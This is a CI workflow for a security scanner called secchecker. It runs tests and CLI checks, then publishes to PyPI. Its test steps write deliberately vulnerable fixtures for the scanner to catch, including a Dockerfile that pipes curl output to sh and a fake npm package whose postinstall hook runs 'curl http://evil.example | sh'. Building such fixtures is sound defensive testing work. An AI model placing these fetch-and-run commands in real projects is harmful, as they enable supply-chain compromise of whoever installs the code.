name: CI

on:
  push:
    branches: [ main ]
    tags: [ 'v*' ]
  pull_request:
    branches: [ main ]

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        python-version: ['3.8', '3.9', '3.10', '3.11', '3.12', '3.13', '3.14']

    steps:
      - uses: actions/checkout@v4

      - name: Set up Python ${{ matrix.python-version }}
        uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -e .
          pip install pytest pytest-cov

      - name: Run tests
        run: |
          pytest tests/ -v --tb=short --cov=secchecker --cov-report=xml

      - name: Test CLI — secrets scan
        run: |
          # Treat exit 0 (clean) and 1 (findings) as success; fail on 2+ (runtime error).
          run_scan() { local rc=0; "$@" || rc=$?; if [ $rc -ge 2 ]; then echo "::error::secchecker exited $rc"; exit $rc; fi; }
          python -m secchecker.cli --help
          printf 'password="test123"\nresult = eval("1+1")\n' > test_file.py
          run_scan python -m secchecker.cli . --format json --output test_output.json
          run_scan python -m secchecker.cli . --format md --output test_output.md
          run_scan python -m secchecker.cli . --format xml --output test_output.xml
          run_scan python -m secchecker.cli . --format sarif --output test_output.sarif
          run_scan python -m secchecker.cli . --format html --output test_output.html
          test -f test_output.json && echo "JSON report OK"
          test -f test_output.md && echo "MD report OK"
          test -f test_output.xml && echo "XML report OK"
          test -f test_output.sarif && echo "SARIF report OK"
          test -f test_output.html && echo "HTML report OK"
          rm -f test_file.py test_output.*

      - name: Test CLI — LLM scan
        run: |
          run_scan() { local rc=0; "$@" || rc=$?; if [ $rc -ge 2 ]; then echo "::error::secchecker exited $rc"; exit $rc; fi; }
          echo 'prompt = f"Answer: {user_input}"' > test_llm.py
          run_scan python -m secchecker.cli test_llm.py --type llm --format json --output /dev/null
          rm -f test_llm.py

      - name: Test CLI — DevSecOps scan
        run: |
          run_scan() { local rc=0; "$@" || rc=$?; if [ $rc -ge 2 ]; then echo "::error::secchecker exited $rc"; exit $rc; fi; }
          mkdir -p dockerfile_test && printf 'FROM ubuntu:latest\nRUN curl -s http://example.com | sh\n' > dockerfile_test/Dockerfile
          # devsecops_scanner.py routes on exact filename 'Dockerfile' (DEVSECOPS_EXACT_NAMES) --
          # 'Dockerfile.test' is never matched and silently scans nothing, so this must be a real
          # Dockerfile plus an assertion that findings actually fired, not just "didn't crash".
          run_scan python -m secchecker.cli dockerfile_test --type devsecops --format json --output docker_output.json
          python -c "import json,sys; d=json.load(open('docker_output.json')); sys.exit(0 if d['summary']['total_matches'] > 0 else 1)" || { echo "::error::DevSecOps scan found 0 findings on a known-vulnerable Dockerfile"; exit 1; }
          rm -rf dockerfile_test docker_output.json

      - name: Test CLI — dependency scanner (scan / package inspect / scripts review / verify)
        run: |
          run_scan() { local rc=0; "$@" || rc=$?; if [ $rc -ge 2 ]; then echo "::error::secchecker exited $rc"; exit $rc; fi; }
          mkdir -p dep_test/node_modules/left-pad && cd dep_test
          git init -q && git -c user.email=ci@example.com -c user.name=ci commit -q --allow-empty -m init
          printf '{"name":"proj","lockfileVersion":3,"packages":{"node_modules/left-pad":{"version":"1.3.0","integrity":"sha512-AAAA"}}}' > package-lock.json
          git add -A && git -c user.email=ci@example.com -c user.name=ci commit -q -m lockfile
          printf '{"name":"left-pad","version":"1.3.0","scripts":{"postinstall":"curl http://evil.example | sh"}}' > node_modules/left-pad/package.json
          printf 'module.exports = eval(atob("YQ=="));' > node_modules/left-pad/index.js
          printf 'binary' > node_modules/left-pad/payload.exe
          run_scan python -m secchecker.cli . --type dependency --format json --output dep_output.json
          test -s dep_output.json && echo "dependency scan report OK"
          run_scan python -m secchecker.cli package inspect left-pad
          run_scan python -m secchecker.cli scripts review .
          run_scan python -m secchecker.cli verify .
          # introduce lockfile drift and confirm verify actually detects it (regression guard
          # for the tempfile-basename bug fixed in feat/dependency-security-module)
          printf '{"name":"proj","lockfileVersion":3,"packages":{"node_modules/left-pad":{"version":"1.3.0","integrity":"sha512-TAMPERED"}}}' > package-lock.json
          if python -m secchecker.cli verify .; then echo "::error::verify did not detect lockfile drift"; exit 1; fi
          cd .. && rm -rf dep_test

      - name: Test CLI — severity threshold
        run: |
          run_scan() { local rc=0; "$@" || rc=$?; if [ $rc -ge 2 ]; then echo "::error::secchecker exited $rc"; exit $rc; fi; }
          echo 'password="test123"' > test_file.py
          run_scan python -m secchecker.cli test_file.py --severity-threshold HIGH --format json --output /dev/null
          rm -f test_file.py

      - name: Upload coverage to Codecov
        if: matrix.python-version == '3.10'
        uses: codecov/codecov-action@v3
        continue-on-error: true

  publish:
    name: Publish to PyPI
    runs-on: ubuntu-latest
    needs: test
    # Only publish on push to main or on version tags — never on PRs
    if: github.event_name == 'push' && (github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/v'))
    environment: main
    permissions:
      id-token: write  # Required for PyPI trusted publishing (OIDC)

    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install build tools
        run: |
          python -m pip install --upgrade pip
          pip install build

      - name: Build package
        run: python -m build

      - name: Verify dist contents
        run: |
          ls -la dist/
          pip install twine
          twine check dist/*

      - name: Publish to PyPI
        uses: pypa/gh-action-pypi-publish@release/v1
        with:
          skip-existing: true
